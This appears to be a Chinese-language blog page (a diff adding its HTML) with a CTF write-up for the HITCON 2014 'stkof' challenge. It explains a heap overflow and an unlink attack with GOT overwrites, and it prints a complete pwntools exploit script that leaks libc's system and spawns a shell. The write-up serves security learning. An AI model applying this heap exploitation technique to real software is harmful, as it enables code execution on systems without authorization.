@@ -1,0 +1,957 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next muse" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,ctf,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="准备工作ida打开，有反调试，nop掉，或者将时间改成很长  安全保护措施，可以写got表  寻找漏洞，free会将判断变量置0，不存在double free  那么同样也不存在uaf漏洞  edit的时候，size没有限制，可堆溢出  这种没有输出什么的程序，代码可以写得相当潇洒 unlink乍一看，没有输出函数啊，怎么泄露呢 后来想了想，没有输出函数，创造条件也要构造啊 可以改写strlen为">
+<meta name="keywords" content="pwn,ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON CTF 2014 stkof">
+<meta property="og:url" content="https://www.giantbranch.cn/2017/12/04/HITCON CTF 2014 stkof/index.html">
+<meta property="og:site_name" content="giantbranch&#39;s blog">
+<meta property="og:description" content="准备工作ida打开，有反调试，nop掉，或者将时间改成很长  安全保护措施，可以写got表  寻找漏洞，free会将判断变量置0，不存在double free  那么同样也不存在uaf漏洞  edit的时候，size没有限制，可堆溢出  这种没有输出什么的程序，代码可以写得相当潇洒 unlink乍一看，没有输出函数啊，怎么泄露呢 后来想了想，没有输出函数，创造条件也要构造啊 可以改写strlen为">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1512996880500.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1512996880501.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1512996908048.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1512996908049.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1512996908050.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1512996908651.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1512996908651.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1513069159761.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1512996908696.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1512996908665.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1512996908666.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1512996881094.jpg">
+<meta property="og:updated_time" content="2023-10-13T13:14:33.054Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HITCON CTF 2014 stkof">
+<meta name="twitter:description" content="准备工作ida打开，有反调试，nop掉，或者将时间改成很长  安全保护措施，可以写got表  寻找漏洞，free会将判断变量置0，不存在double free  那么同样也不存在uaf漏洞  edit的时候，size没有限制，可堆溢出  这种没有输出什么的程序，代码可以写得相当潇洒 unlink乍一看，没有输出函数啊，怎么泄露呢 后来想了想，没有输出函数，创造条件也要构造啊 可以改写strlen为">
+<meta name="twitter:image" content="http://pic.giantbranch.cn/pic/1512996880500.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.giantbranch.cn/2017/12/04/HITCON CTF 2014 stkof/">
+
+
+
+
+
+  <title>HITCON CTF 2014 stkof | giantbranch's blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-121265336-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">giantbranch's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            读过的书
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2017/12/04/HITCON CTF 2014 stkof/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="giantbranch">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giantbranch's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">HITCON CTF 2014 stkof</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-04T00:00:00+00:00">
+                2017-12-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/12/04/HITCON CTF 2014 stkof/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/12/04/HITCON CTF 2014 stkof/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>ida打开，有反调试，nop掉，或者将时间改成很长</p>
+<p><img src="http://pic.giantbranch.cn/pic/1512996880500.jpg" alt></p>
+<p>安全保护措施，可以写got表</p>
+<p><img src="http://pic.giantbranch.cn/pic/1512996880501.jpg" alt></p>
+<p>寻找漏洞，free会将判断变量置0，不存在double free</p>
+<p><img src="http://pic.giantbranch.cn/pic/1512996908048.jpg" alt></p>
+<p>那么同样也不存在uaf漏洞</p>
+<p><img src="http://pic.giantbranch.cn/pic/1512996908049.jpg" alt></p>
+<p>edit的时候，size没有限制，可堆溢出</p>
+<p><img src="http://pic.giantbranch.cn/pic/1512996908050.jpg" alt></p>
+<p>这种没有输出什么的程序，代码可以写得相当潇洒</p>
+<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>乍一看，没有输出函数啊，怎么泄露呢</p>
+<p>后来想了想，没有输出函数，创造条件也要构造啊</p>
+<p>可以改写strlen为puts，printf什么的</p>
+<p><img src="http://pic.giantbranch.cn/pic/1512996908651.jpg" alt></p>
+<p>那么就可以将2的指针改了</p>
+<p><img src="http://pic.giantbranch.cn/pic/1512996908651.jpg" alt></p>
+<p>跟着我们就可以通过操作2来覆盖1，利用1去写，再去读什么的</p>
+<p>这里我写strlen的got表为plt_printf，这样就相当于构造了格式化字符串漏洞,不过有任意地址读写，就不用这个了，不过我看到有人用这个进行泄露的</p>
+<p><img src="http://pic.giantbranch.cn/pic/1513069159761.jpg" alt></p>
+<p>之后通过下面的leak函数泄露即可</p>
+<p><img src="http://pic.giantbranch.cn/pic/1512996908696.jpg" alt></p>
+<p>使用pwntools的DynELF泄露system地址</p>
+<p><img src="http://pic.giantbranch.cn/pic/1512996908665.jpg" alt></p>
+<p>最后将atoi的got表改了</p>
+<p><img src="http://pic.giantbranch.cn/pic/1512996908666.jpg" alt></p>
+<p>最终结果</p>
+<p><img src="http://pic.giantbranch.cn/pic/1512996881094.jpg" alt></p>
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># http://blog.csdn.net/fuchuangbob/article/details/51649353</span></span><br><span class="line"><span class="comment"># http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug' </span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./a679df07a8f3a8d590febad45336d031-stkof"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./a679df07a8f3a8d590febad45336d031-stkof"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("libc.so.6")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print proc.pidof(p)[0]</span></span><br><span class="line">plt_printf = elf.plt[<span class="string">"printf"</span>]</span><br><span class="line">got_strlen = elf.got[<span class="string">"strlen"</span>]</span><br><span class="line">got_atoi = elf.got[<span class="string">"atoi"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    index = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">output</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload = <span class="string">"\x00"</span>*<span class="number">0x10</span> + p64(address)</span><br><span class="line">    edit(<span class="number">2</span>, payload)</span><br><span class="line">    output(<span class="number">1</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">"OK"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"FAIL"</span> <span class="keyword">in</span> data:</span><br><span class="line">        data = data.replace(<span class="string">"FAIL\n"</span>, <span class="string">""</span>)</span><br><span class="line">    data = data.split(<span class="string">'\x0aOK'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"..."</span> <span class="keyword">in</span> data:</span><br><span class="line">        data = data.replace(<span class="string">"..."</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">"//TODO"</span> <span class="keyword">in</span> data:</span><br><span class="line">        data = data.replace(<span class="string">"//TODO"</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">""</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"\x00"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------info leak---------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"index: "</span> + add(<span class="number">0x80</span>) <span class="comment"># not use , not in a same memory</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"index: "</span> + add(<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"index: "</span> + add(<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"index: "</span> + add(<span class="number">0x80</span>)</span><br><span class="line"><span class="comment"># fd + 0x18 -&gt; P ?</span></span><br><span class="line"><span class="comment"># bk + 0x10 -&gt; P?</span></span><br><span class="line"><span class="comment"># FD = P-&gt;fd;                                                            \</span></span><br><span class="line"><span class="comment"># BK = P-&gt;bk; </span></span><br><span class="line"><span class="comment"># FD-&gt;bk = BK;                                                      </span></span><br><span class="line"><span class="comment"># BK-&gt;fd = FD;</span></span><br><span class="line"><span class="comment"># at last BK-&gt;fd = FD; just store-&gt;fd = store + 0x10 = store-0x8</span></span><br><span class="line">store = <span class="number">0x602140</span></span><br><span class="line">fakechunk = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) + p64(store<span class="number">-0x8</span>) + p64(store)  + <span class="string">"A"</span> * <span class="number">0x60</span> + p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>) + <span class="string">"A"</span> * <span class="number">0x80</span></span><br><span class="line">edit(<span class="number">2</span>, fakechunk)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite got_strlen with got_printf</span></span><br><span class="line">payload = <span class="string">"\x00"</span> * <span class="number">0x10</span> + p64(got_strlen)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line">edit(<span class="number">1</span>, p64(plt_printf))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"plt_printf : "</span> + hex(plt_printf)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"got_strlen : "</span> + hex(got_strlen)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak system</span></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">"./a679df07a8f3a8d590febad45336d031-stkof"</span>))</span><br><span class="line">system_addr = int(d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr = "</span> + hex(system_addr)</span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># write </span></span><br><span class="line">payload = <span class="string">"\x00"</span> * <span class="number">0x10</span> + p64(got_atoi) </span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"FAIL\n"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="另外的overwrite目标"><a href="#另外的overwrite目标" class="headerlink" title="另外的overwrite目标"></a>另外的overwrite目标</h1><p>有人将free改成puts，printf，其实也是可以的，<br>最后写system的时候也可以将free改回system</p>
+<p><a href="http://blog.csdn.net/fuchuangbob/article/details/51649353" target="_blank" rel="noopener">http://blog.csdn.net/fuchuangbob/article/details/51649353</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>自愿打赏专区</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+    
+      <div class="footer-custom">
+        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
+      </div>
+    
+
+    
+    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
+    </div>
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    giantbranch
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.giantbranch.cn/2017/12/04/HITCON CTF 2014 stkof/" title="HITCON CTF 2014 stkof">https://www.giantbranch.cn/2017/12/04/HITCON CTF 2014 stkof/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/11/23/CVE-2012-3569-VMWare OVF Tools 格式化字符串漏洞/" rel="next" title="CVE-2012-3569-VMWare OVF Tools 格式化字符串漏洞">
+                <i class="fa fa-chevron-left"></i> CVE-2012-3569-VMWare OVF Tools 格式化字符串漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/12/10/SECCON CTF 2017 Powerful_Shell/" rel="prev" title="SECCON CTF 2017 Powerful_Shell">
+                SECCON CTF 2017 Powerful_Shell <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+    <div class="footer-custom">
+	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">giantbranch</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">160</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">201</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
+                    
+                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
